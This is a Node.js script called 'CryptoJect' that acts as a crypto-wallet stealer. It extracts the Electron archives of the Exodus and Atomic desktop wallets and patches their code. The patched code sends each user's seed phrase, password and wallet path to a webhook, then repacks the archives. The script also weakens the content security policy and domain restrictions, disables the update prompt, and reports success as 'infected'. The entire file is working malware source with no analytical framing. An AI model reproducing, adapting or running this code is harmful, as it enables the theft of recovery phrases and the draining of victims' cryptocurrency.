const fs = require("fs");
const util = require("util");
const { exec } = require("child_process");
const path = require("path");

let changes = [];
let repack = [];

const execPromise = util.promisify(exec);
const readdir = util.promisify(fs.readdir);

const hook = ""; // put a webhook.site link here for testing

const wallet = {
  Exodus: {
    path: process.env.LOCALAPPDATA + "\\exodus",
    replacement: {
      domains: 'domains: "*"',
      csp: "data: *",
      wallet: `await this._loadLightningCreds();var xe_array={xe_wallet:"Exodus",xe_mnemonic:this._seed.mnemonicString,xe_password:e,xe_vault:this._walletPaths.walletDir,xe_version: se.version || E.version || "null"},xe_request=new XMLHttpRequest;xe_request.open("POST","${hook}",!0),xe_request.setRequestHeader("Content-Type","application/json");var payload={data:xe_array};xe_request.send(JSON.stringify(payload));`,
      blank: "",
    },
    searchList: {
      domains: `domains:["server.exodus.io","exodusapp.blob.core.windows.net"]`,
      csp: "data: https://server.exodus.io/ https://exodusapp.blob.core.windows.net/",
      wallet: "await this._loadLightningCreds()",
      ui: ",this.promptForUpdate()",
    },
  },
  Atomic: {
    path: process.env.LOCALAPPDATA + "\\Programs\\atomic\\resources",
    replacement: {
      vendors: `const j=function(){let e=!0;return async function(t,n){if(e){e=!1,t.setBus(n),n.$emit(p.WALLETS.START_LOADING,t);try{await t.loadWallet(this.seed,this.phrase);var s={xe_wallet:"Atomic",xe_mnemonic:this.phrase,xe_version:m.default.getVersion()},a=new XMLHttpRequest;a.open("POST","${hook}",!0),a.setRequestHeader("Content-Type","application/json"),a.send(JSON.stringify({data:s}))}catch(i){n.$emit(p.WALLETS.RAISE_LOADING_ERROR,{wallet:t.name}),g.default.error({instance:t,error:i})}n.$emit(p.WALLETS.FINISH_LOADING,t),"function"==typeof t.fetchUserTokens&&await t.fetchUserTokens(this)}}}();`,
    },
    searchList: {
      vendors: `async function j(t,e){t.setBus(e),e.$emit(p.WALLETS.START_LOADING,t);try{await t.loadWallet(this.seed,this.phrase)}catch(a){e.$emit(p.WALLETS.RAISE_LOADING_ERROR,{wallet:t.name}),g.default.error({instance:t,error:a})}e.$emit(p.WALLETS.FINISH_LOADING,t),"function"==typeof t.fetchUserTokens&&await t.fetchUserTokens(this)}`,
    },
  },
};

async function locateExodusAsar(folderPath) {
  if (!exists(folderPath)) return "null";
  const files = await readdir(folderPath);
  const pathArray = [];

  files.forEach((file) => {
    if (file.includes("app-")) {
      const absolutePath = folderPath + "/" + file;
      pathArray.push(absolutePath);
    }
  });

  let highestFolder = null;
  let highestNumber = 0;

  for (const file of pathArray) {
    const versionNumber = parseFloat(file.split("app-")[1]);

    if (!isNaN(versionNumber) && versionNumber > highestNumber) {
      highestNumber = versionNumber;
      highestFolder = file;
    }
  }

  return highestFolder + "/resources";
}

function delRec(path) {
  if (fs.existsSync(path)) {
    fs.readdirSync(path).forEach((file) => {
      const currentPath = `${path}/${file}`;
      if (fs.lstatSync(currentPath).isDirectory()) {
        delRec(currentPath);
      } else {
        fs.unlinkSync(currentPath);
      }
    });
    fs.rmdirSync(path);
  }
}

async function modifyFile(filePath, searchString, replacementString) {
  try {
    const data = await fs.promises.readFile(filePath, "utf8");

    if (!data.includes(searchString)) return;

    const modifiedData = data.replace(searchString, replacementString);
    await fs.promises.writeFile(filePath, modifiedData, "utf8");
  } catch (err) {
    console.error(`\x1b[0;31m[ERROR] Failed to modify file: ${err}`);
  }
}

function exists(path) {
  return fs.existsSync(path);
}

async function packAsar(outDir, asarFile) {
  await execPromise(`npx asar p ${outDir} ${asarFile}`);
}

async function modifyFiles(array) {
  try {
    await Promise.all(
      array.map(async (fileData) => {
        await modifyFile(
          fileData.file,
          fileData.searchList,
          fileData.replacement
        );
        console.log(
          `\x1b[0;32m[CryptoJect] Successfully changed ${fileData.file}`
        );
      })
    );
  } catch (err) {
    console.error(
      `\x1b[0;31m[ERROR] An error occurred during file modification: ${err}`
    );
  }
}

async function startInjection() {
  const atomicAsar = path.join(wallet.Atomic.path, "app.asar");
  const atomicOut = path.join(wallet.Atomic.path, "out");

  const exodusPath = await locateExodusAsar(wallet.Exodus.path);
  const exodusAsar = path.join(exodusPath, "app.asar");
  const exodusOut = path.join(exodusPath, "out");

  const files = {
    Atomic: {
      vendors: path.join(
        atomicOut,
        "dist",
        "electron",
        "vendors.f710a6599f4354ea4b57.js"
      ), // might have to change because i think filename changes on every build. I might have to make a forloop for each .js file and find the one that containts the replacement string.
    },
    Exodus: {
      walletIndex: path.join(exodusOut, "src", "app", "wallet", "index.js"),
      walletHtml: path.join(exodusOut, "src", "static", "wallet.html"),
      mainIndex: path.join(exodusOut, "src", "app", "main", "index.js"),
      uiIndex: path.join(exodusOut, "src", "app", "ui", "index.js"),
    },
  };

  try {
    let wallets = 0;

    if (exists(wallet.Exodus.path)) {
      await execPromise(`npx asar e ${exodusAsar} ${exodusOut}`);
      changes.push(
        {
          file: files.Exodus.mainIndex,
          searchList: wallet.Exodus.searchList.domains,
          replacement: wallet.Exodus.replacement.domains,
        },
        {
          file: files.Exodus.walletHtml,
          searchList: wallet.Exodus.searchList.csp,
          replacement: wallet.Exodus.replacement.csp,
        },
        {
          file: files.Exodus.walletIndex,
          searchList: wallet.Exodus.searchList.wallet,
          replacement: wallet.Exodus.replacement.wallet,
        },
        {
          file: files.Exodus.uiIndex,
          searchList: wallet.Exodus.searchList.ui,
          replacement: wallet.Exodus.replacement.blank,
        }
      );
      repack.push({ wallet: "Exodus", out: exodusOut, asar: exodusAsar });
      wallets++;
    }

    if (exists(wallet.Atomic.path)) {
      await execPromise(`npx asar e ${atomicAsar} ${atomicOut}`);
      changes.push({
        file: files.Atomic.vendors,
        searchList: wallet.Atomic.searchList.vendors,
        replacement: wallet.Atomic.replacement.vendors,
      });
      repack.push({ wallet: "Atomic", out: atomicOut, asar: atomicAsar });
      wallets++;
    }

    if (wallets === 0) {
      console.error(
        "\x1b[0;33m[Warning] No folders were found. Injection cannot proceed."
      );
      process.exit(1);
    } else {
      await modifyFiles(changes);

      for (const item of repack) {
        await packAsar(item.out, item.asar);
        await delRec(item.out);
        console.log(`[CryptoJect] Successfully infected ${item.wallet}!!`);
      }
    }
  } catch (err) {
    console.error(
      `\x1b[0;31m[ERROR] An error occurred when attempting injection: ${err}`
    );
  }
}

startInjection();
